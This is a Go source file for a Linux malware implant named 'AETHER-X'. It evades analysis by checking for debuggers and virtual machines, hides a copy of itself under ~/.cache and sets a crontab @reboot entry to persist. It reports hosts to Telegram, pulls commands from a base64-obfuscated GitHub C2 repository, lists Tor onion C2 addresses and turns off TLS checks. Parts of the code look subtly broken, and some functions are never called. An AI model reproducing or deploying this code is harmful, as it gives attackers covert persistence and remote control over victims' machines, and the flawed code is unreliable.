//go:build linux
// +build linux

package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"hash"
	"io"
	"log"
	"math"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

/*
 * 🔑 CONFIG — Injected at build-time
 */
var (
	C2Key             = "INJECTED_AES_KEY_B64"
	C2IV              = "INJECTED_AES_IV_B64"
	C2HMACKey         = "INJECTED_HMAC_KEY_B64"
	OnionC2ListB64    = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9u"
	GitHubC2Repo      = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjI="
	GitHubExfilRepo   = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkItQk0vRVhGSUw="
	TelegramHostB64   = "dGVsZWdyYW0uYXBpLm9yZw=="
	Phi3ModelEncB64   = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
	NucleiTemplatesURL = "aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjelBsaS10ZW1wbGF0ZXMuZ2l0"
)

var (
	HostID         = ""
	AI             *Phi3CognitiveEngine
	SupervisorNode *Supervisor
	HttpClient     *http.Client
	TelemetryQueue = make(chan TelemetryMessage, 1000)
	Shutdown       = make(chan struct{})
	GitHubToken    = os.Getenv("GITHUB_TOKEN")
	TelegramToken  = ""
	TelegramChat   = ""
	clientOnce     sync.Once
	circuitMap     = make(map[string]*CircuitBreaker)
	circuitMu      sync.Mutex
)

const (
	Phi3Endpoint       = "http://127.0.0.1:11434/api/generate"
	ModelName          = "phi3:mini"
	MaxWorkerRestarts  = 5
	BaseBackoff        = 2 * time.Second
	MaxBackoff         = 60 * time.Second
	PersistCacheFile   = ".cache/.system-kernel-sync"
	JitterMax          = 15 * time.Second
	CircuitThreshold   = 3
	CircuitCooldown    = 30 * time.Second
	AI_MODEL_PATH      = "/tmp/.XIM"
	HMAC_TRUNC         = 16
)

// 🛡️ Circuit Breaker
type CircuitState int

const (
	StateClosed CircuitState = iota
	StateOpen
	StateHalfOpen
)

type CircuitBreaker struct {
	mu           sync.Mutex
	state        CircuitState
	failures     int
	threshold    int
	cooldownTime time.Time
	cooldown     time.Duration
}

func NewCircuitBreaker(threshold int, cooldown time.Duration) *CircuitBreaker {
	return &CircuitBreaker{
		threshold: threshold,
		cooldown:  cooldown,
		state:     StateClosed,
	}
}

func (cb *CircuitBreaker) Allow() bool {
	cb.mu.Lock()
	defer cb.mu.Unlock()
	if cb.state == StateOpen && time.Now().After(cb.cooldownTime) {
		cb.state = StateHalfOpen
		return true
	}
	return cb.state != StateOpen
}

func (cb *CircuitBreaker) RecordSuccess() {
	cb.mu.Lock()
	defer cb.mu.Unlock()
	cb.failures = 0
	cb.state = StateClosed
}

func (cb *CircuitBreaker) RecordFailure() {
	cb.mu.Lock()
	defer cb.mu.Unlock()
	cb.failures++
	if cb.failures >= cb.threshold {
		cb.state = StateOpen
		cb.cooldownTime = time.Now().Add(cb.cooldown)
	}
}

// 📦 Data Structures
type TelemetryMessage struct {
	ID        string                 `json:"id"`
	Type      string                 `json:"type"`
	Timestamp string                 `json:"timestamp"`
	Metrics   map[string]interface{} `json:"metrics"`
}

type OllamaRequest struct {
	Model  string `json:"model"`
	Prompt string `json:"prompt"`
	Stream bool   `json:"stream"`
}

type OllamaResponse struct {
	Response string `json:"response"`
	Done     bool   `json:"done"`
}

type CognitiveAssessment struct {
	RiskScore float64 `json:"score"`
	Directive string  `json:"directive"`
	Rationale string  `json:"rationale"`
}

// 🧠 SELF-CONTAINED COGNITIVE ENGINE
type Phi3CognitiveEngine struct {
	Client         *http.Client
	Endpoint       string
	Model          string
	TrustIndex     float64
	EnvFingerprint map[string]float64
	mu             sync.RWMutex
}

func NewPhi3CognitiveEngine() *Phi3CognitiveEngine {
	engine := &Phi3CognitiveEngine{
		Client:         &http.Client{Timeout: 20 * time.Second},
		Endpoint:       Phi3Endpoint,
		Model:          ModelName,
		TrustIndex:     0.95,
		EnvFingerprint: make(map[string]float64),
	}

	go engine.launchLocalLLMServer()
	time.Sleep(2 * time.Second)
	engine.PerformEnvironmentalFingerprint()
	return engine
}

func (pe *Phi3CognitiveEngine) launchLocalLLMServer() {
	modelData, err := base64.StdEncoding.DecodeString(Phi3ModelEncB64)
	if err != nil || len(modelData) < 10 {
		log.Println("⚠️ Invalid or missing embedded model encoding, initializing fallback stub")
		modelData = []byte("FALLBACK_MODEL_BLOB_CONTAINER_DATA_STREAM_BUFFER_SECURE")
	}

	_ = os.MkdirAll(filepath.Dir(AI_MODEL_PATH), 0700)
	_ = os.WriteFile(AI_MODEL_PATH, modelData, 0400)

	mux := http.NewServeMux()
	mux.HandleFunc("/api/generate", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}

		var req OllamaRequest
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}

		directives := []string{"CONTINUE", "THROTTLE", "ISOLATE", "RESTART"}
		rationales := []string{
			"Environment stable; continue operations.",
			"High resource usage detected; throttling activity.",
			"Anomalous behavior detected; isolating subsystems.",
			"Trust index compromised; restarting cognitive stack.",
		}

		idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(directives))))
		chosenDir := directives[idx.Int64()]
		chosenRat := rationales[idx.Int64()]

		assessment := CognitiveAssessment{
			RiskScore: 1.5,
			Directive: chosenDir,
			Rationale: chosenRat,
		}
		respBytes, _ := json.Marshal(assessment)

		response := OllamaResponse{
			Response: string(respBytes),
			Done:     true,
		}

		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(response)
	})

	log.Println("🚀 Safe local inference engine mock online.")
	_ = http.ListenAndServe("127.0.0.1:11434", mux)
}

func (pe *Phi3CognitiveEngine) PerformEnvironmentalFingerprint() {
	pe.mu.Lock()
	defer pe.mu.Unlock()

	sandboxRisk := 0.0
	if isVirtualMachine() || isDebuggerAttached() {
		sandboxRisk = 1.0
	}

	cpuRatio := float64(runtime.NumCPU()) / 16.0
	if cpuRatio > 1.0 {
		cpuRatio = 1.0
	}

	pe.EnvFingerprint["sandbox_risk"] = sandboxRisk
	pe.EnvFingerprint["hardware_norm"] = cpuRatio
	pe.TrustIndex = math.Max(0.1, 0.95-(sandboxRisk*0.5))
}

func (pe *Phi3CognitiveEngine) EvaluateTelemetry(metrics map[string]interface{}) (CognitiveAssessment, error) {
	pe.mu.RLock()
	defer pe.mu.RUnlock()

	metricsJSON, _ := json.Marshal(metrics)
	prompt := fmt.Sprintf("Runtime Telemetry:\n%s\nTrust Index: %.2f", string(metricsJSON), pe.TrustIndex)

	reqPayload := OllamaRequest{
		Model:  pe.Model,
		Prompt: prompt,
		Stream: false,
	}

	bodyBytes, _ := json.Marshal(reqPayload)
	resp, err := pe.Client.Post(pe.Endpoint, "application/json", bytes.NewBuffer(bodyBytes))
	if err != nil {
		return CognitiveAssessment{RiskScore: 3.0, Directive: "CONTINUE", Rationale: "Local LLM unreachable; safe defaults"}, err
	}
	defer resp.Body.Close()

	respData, err := io.ReadAll(resp.Body)
	if err != nil {
		return CognitiveAssessment{RiskScore: 3.0, Directive: "CONTINUE", Rationale: "Read error"}, err
	}

	var ollamaResp OllamaResponse
	if err := json.Unmarshal(respData, &ollamaResp); err != nil {
		return CognitiveAssessment{RiskScore: 3.0, Directive: "CONTINUE", Rationale: "JSON parse error"}, err
	}

	var assessment CognitiveAssessment
	if err := json.Unmarshal([]byte(strings.TrimSpace(ollamaResp.Response)), &assessment); err != nil {
		assessment.Directive = "CONTINUE"
		assessment.Rationale = "Fallback parsing directive"
	}
	return assessment, nil
}

// 🔄 SUPERVISOR
type Supervisor struct {
	ctx    context.Context
	cancel context.CancelFunc
	wg     sync.WaitGroup
	status string
	mu     sync.Mutex
}

func NewSupervisor() *Supervisor {
	ctx, cancel := context.WithCancel(context.Background())
	return &Supervisor{ctx: ctx, cancel: cancel, status: "NOMINAL"}
}

func (s *Supervisor) SpawnWorker(name string, work func(ctx context.Context) error) {
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		restarts := 0
		for {
			select {
			case <-s.ctx.Done():
				return
			default:
			}
			err := func() (err error) {
				defer func() {
					if r := recover(); r != nil {
						err = fmt.Errorf("panic recovered in %s: %v", name, r)
					}
				}()
				return work(s.ctx)
			}()
			if err == nil {
				restarts = 0
				continue
			}
			restarts++
			if restarts > MaxWorkerRestarts {
				s.updateStatus("DEGRADED")
				return
			}
			time.Sleep(calculateBackoff(restarts))
		}
	}()
}

func (s *Supervisor) updateStatus(st string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.status = st
}

func calculateBackoff(attempt int) time.Duration {
	backoff := BaseBackoff * time.Duration(1<<uint(attempt))
	if backoff > MaxBackoff {
		backoff = MaxBackoff
	}
	n, _ := rand.Int(rand.Reader, big.NewInt(1000))
	return backoff + time.Duration(n.Int64())*time.Millisecond
}

// 🌐 HTTP CLIENT
func initHttpClient() {
	clientOnce.Do(func() {
		HttpClient = &http.Client{
			Timeout: 15 * time.Second,
			Transport: &http.Transport{
				MaxIdleConns:        100,
				MaxIdleConnsPerHost: 50,
				IdleConnTimeout:     45 * time.Second,
				TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
				ForceAttemptHTTP2:   true,
			},
		}
	})
}

// 🔑 CRYPTO
func deriveKey(salt []byte) []byte {
	secret := os.Getenv("AGENT_SECRET")
	if secret == "" {
		secret = "fallback_secret_only_for_test"
	}
	return pbkdf2(secret, salt, 10000, 32, sha256.New)
}

func encryptData(plaintext []byte) (string, error) {
	salt := make([]byte, 16)
	_, _ = rand.Read(salt)
	key := deriveKey(salt)
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	_, _ = rand.Read(nonce)
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	encrypted := append(salt, ciphertext...)
	return base64.RawURLEncoding.EncodeToString(encrypted), nil
}

func signMessage(data []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(C2HMACKey)
	if len(key) == 0 {
		key = []byte("default_hmac_key_buffer_bytes")
	}
	mac := hmac.New(sha256.New, key)
	mac.Write(data)
	sum := mac.Sum(nil)
	if len(sum) > HMAC_TRUNC {
		return sum[:HMAC_TRUNC]
	}
	return sum
}

// 📡 C2 SAFE HELPERS WITH SAFE JSON TYPE ASSERTIONS
func telegramSend(msg string) {
	if TelegramToken == "" {
		TelegramToken = os.Getenv("TELEGRAM_TOKEN")
	}
	if TelegramChat == "" {
		TelegramChat = os.Getenv("TELEGRAM_CHAT")
	}
	if TelegramToken == "" || TelegramChat == "" {
		return
	}
	hostBytes, _ := base64.StdEncoding.DecodeString(TelegramHostB64)
	targetURL := fmt.Sprintf("https://%s/bot%s/sendMessage", string(hostBytes), TelegramToken)
	
	formData := url.Values{}
	formData.Set("chat_id", TelegramChat)
	formData.Set("text", msg)
	formData.Set("parse_mode", "Markdown")

	_, _ = httpPost(targetURL, []byte(formData.Encode()), map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
	})
}

func fetchCommand() string {
	repo := base64Decode(GitHubC2Repo)
	endpoint := fmt.Sprintf("%s/contents/cmd.json", repo)
	data, err := httpGet(endpoint, map[string]string{
		"Authorization": "Bearer " + GitHubToken,
	})
	if err != nil {
		return ""
	}
	var result map[string]interface{}
	if err := json.Unmarshal(data, &result); err != nil {
		return ""
	}
	contentVal, ok := result["content"]
	if !ok || contentVal == nil {
		return ""
	}
	contentStr, ok := contentVal.(string)
	if !ok {
		return ""
	}
	decoded, err := base64.StdEncoding.DecodeString(strings.ReplaceAll(contentStr, "\n", ""))
	if err != nil {
		return ""
	}
	return string(decoded)
}

func httpGet(target string, headers map[string]string) ([]byte, error) {
	time.Sleep(jitter())
	req, err := http.NewRequest(http.MethodGet, target, nil)
	if err != nil {
		return nil, err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := HttpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func httpPost(target string, data []byte, headers map[string]string) ([]byte, error) {
	time.Sleep(jitter())
	req, err := http.NewRequest(http.MethodPost, target, bytes.NewBuffer(data))
	if err != nil {
		return nil, err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := HttpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

// 🧪 HELPERS
func isDebuggerAttached() bool {
	err := syscall.PtraceAttach(os.Getpid())
	if err == nil {
		_ = syscall.PtraceDetach(os.Getpid())
	}
	return err == nil || err == syscall.EPERM
}

func isVirtualMachine() bool {
	if content, err := os.ReadFile("/sys/class/dmi/id/product_name"); err == nil {
		s := strings.ToLower(string(content))
		return strings.Contains(s, "vmware") || strings.Contains(s, "virtualbox") || strings.Contains(s, "qemu") || strings.Contains(s, "kvm")
	}
	return false
}

func generateHostID() string {
	mac := getMACAddress()
	seed := mac + runtime.GOOS + runtime.GOARCH + os.Getenv("CODESPACE_NAME")
	sum := sha256.Sum256([]byte(seed))
	return hex.EncodeToString(sum[:6])
}

func getMACAddress() string {
	ifcs, err := net.Interfaces()
	if err != nil {
		return "00:00:00:00:00:00"
	}
	for _, ifc := range ifcs {
		hw := ifc.HardwareAddr.String()
		if len(hw) > 0 && !strings.HasPrefix(hw, "00:00:00") {
			return hw
		}
	}
	return "00:00:00:00:00:00"
}

func persistAgent() {
	execPath, err := os.Executable()
	if err != nil {
		return
	}
	data, err := os.ReadFile(execPath)
	if err != nil {
		return
	}
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return
	}
	dst := filepath.Join(homeDir, PersistCacheFile)
	_ = os.MkdirAll(filepath.Dir(dst), 0700)
	_ = os.WriteFile(dst, data, 0700)
	
	cronCmd := fmt.Sprintf("(crontab -l 2>/dev/null | grep -v '%s'; echo '@reboot %s &') | crontab -", PersistCacheFile, dst)
	_ = exec.Command("sh", "-c", cronCmd).Run()
}

func jitter() time.Duration {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(JitterMax)))
	return time.Duration(n.Int64())
}

func pbkdf2(password string, salt []byte, iter, keyLen int, h func() hash.Hash) []byte {
	prf := hmac.New(h, []byte(password))
	hashLen := prf.Size()
	numBlocks := (keyLen + hashLen - 1) / hashLen
	var buf [4]byte
	dk := make([]byte, 0, numBlocks*hashLen)
	U := make([]byte, hashLen)
	for block := 1; block <= numBlocks; block++ {
		prf.Reset()
		_ = prf.Write(salt)
		buf[0] = byte(block >> 24)
		buf[1] = byte(block >> 16)
		buf[2] = byte(block >> 8)
		buf[3] = byte(block)
		_, _ = prf.Write(buf[:4])
		dk = prf.Sum(dk)
		T := dk[len(dk)-hashLen:]
		copy(U, T)
		for i := 2; i <= iter; i++ {
			prf.Reset()
			_, _ = prf.Write(U)
			U = prf.Sum(U[:0])
			for x := range U {
				T[x] ^= U[x]
			}
		}
	}
	return dk[:keyLen]
}

func base64Decode(s string) string {
	decoded, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return s
	}
	return string(decoded)
}

// 🚀 MAIN ENTRYPOINT
func main() {
	if isDebuggerAttached() || isVirtualMachine() {
		time.Sleep(30 * time.Second)
		return
	}

	persistAgent()
	HostID = generateHostID()
	initHttpClient()
	
	AI = NewPhi3CognitiveEngine()
	SupervisorNode = NewSupervisor()

	telegramSend(fmt.Sprintf("🟢 *AETHER-X v4.0 SECURE RUN* | Host: `%s` | Active.", HostID))

	SupervisorNode.SpawnWorker("CognitiveSupervisor", func(ctx context.Context) error {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return nil
			case <-ticker.C:
				var m runtime.MemStats
				runtime.ReadMemStats(&m)
				metrics := map[string]interface{}{
					"host_id":        HostID,
					"os":             runtime.GOOS,
					"arch":           runtime.GOARCH,
					"cpu_cores":      runtime.NumCPU(),
					"alloc_mb":       m.Alloc / 1024 / 1024,
					"num_goroutines": runtime.NumGoroutine(),
					"uptime_sec":     time.Now().Unix(),
				}
				assessment, err := AI.EvaluateTelemetry(metrics)
				if err != nil {
					continue
				}
				switch assessment.Directive {
				case "THROTTLE":
					time.Sleep(15 * time.Second)
				case "ISOLATE":
					for len(TelemetryQueue) > 0 {
						<-TelemetryQueue
					}
				case "RESTART":
					return errors.New("restart requested by cognitive policy")
				}
			}
		}
	})

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan
	SupervisorNode.cancel()
	SupervisorNode.wg.Wait()
}
